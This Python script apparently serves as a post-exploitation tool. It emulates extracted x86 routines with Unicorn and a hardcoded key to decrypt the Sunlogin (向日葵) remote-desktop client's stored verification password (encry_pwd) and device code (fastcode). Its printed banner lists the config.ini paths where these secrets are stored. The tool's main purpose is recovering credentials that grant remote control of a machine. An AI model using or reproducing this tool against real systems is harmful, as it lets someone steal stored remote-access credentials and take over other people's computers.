import base64

from ConstCode import *

_key = [
    0x25, 0x5E, 0x24, 0x5E, 0x47, 0x48, 0x73, 0x67, 0x6A, 0x64,
    0x73, 0x61, 0x64, 0x32, 0x34, 0x64, 0x66, 0x66, 0x67, 0x6A,
    0x6B, 0x64, 0x68, 0x77, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x49, 0xB7, 0xEE, 0x01, 0x00, 0x00,
    0x3B, 0xBA, 0xB3, 0x8C, 0xFE, 0x7F, 0x00, 0x00, 0x00, 0x00,
    0x49, 0xB7, 0xEE, 0x01, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00
]


class Init(Base):
    def on_create(self):
        obj = self._get_handle()
        obj.mem_map(self._code_ptr, align(len(init_code)))
        obj.mem_write(self._code_ptr, init_code)

        obj.mem_map(self._data_ptr, 0x2000)
        obj.mem_write(self._data_ptr, bytes(_key))
        obj.reg_write(unicorn.x86_const.UC_X86_REG_RCX, self._data_ptr)

        obj.reg_write(unicorn.x86_const.UC_X86_REG_RDX, 0x19)

    def get_result(self) -> bytes:
        return bytes(self._get_handle().mem_read(self._data_ptr + 60, 0x2000 - 60))


class Decrypt(Base):
    __save_ptr = 0x100000

    def __init__(self, encoded_data, box):
        self.__encoded_data = encoded_data
        self.__box = box
        super().__init__()

    def on_create(self):
        obj = self._get_handle()
        obj.mem_map(self._code_ptr, align(len(decrypt_code)))
        obj.mem_write(self._code_ptr, decrypt_code)

        obj.mem_map(self._data_ptr, 0x2000)
        obj.mem_write(self._data_ptr, self.__box)
        obj.reg_write(unicorn.x86_const.UC_X86_REG_RDX, self._data_ptr)

        obj.mem_map(self.__save_ptr, align(len(self.__encoded_data)))
        obj.mem_write(self.__save_ptr, self.__encoded_data)
        obj.reg_write(unicorn.x86_const.UC_X86_REG_R8, self.__save_ptr)
        obj.reg_write(unicorn.x86_const.UC_X86_REG_R9, int(len(self.__encoded_data) / 8))

    def get_result(self) -> bytes:
        return self._get_handle().mem_read(self.__save_ptr, len(self.__encoded_data))
print("""

    向日葵encry_pwd(本机验证码)，fastcode(本机识别码)提取
 
                                                     --WAF
    """)
print("向日葵默认配置文件路径:")
print("安装版：C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini")
print("便携版：C:\\ProgramData\\Oray\\SunloginClient\\config.ini")
print("本机验证码参数：encry_pwd")
print("本机识别码参数：fastcode(去掉开头字母)\n")
print("请输入需要解密的密码:")
print("解码成功: "+Decrypt(base64.b64decode(input()), Init().start()).start().decode())
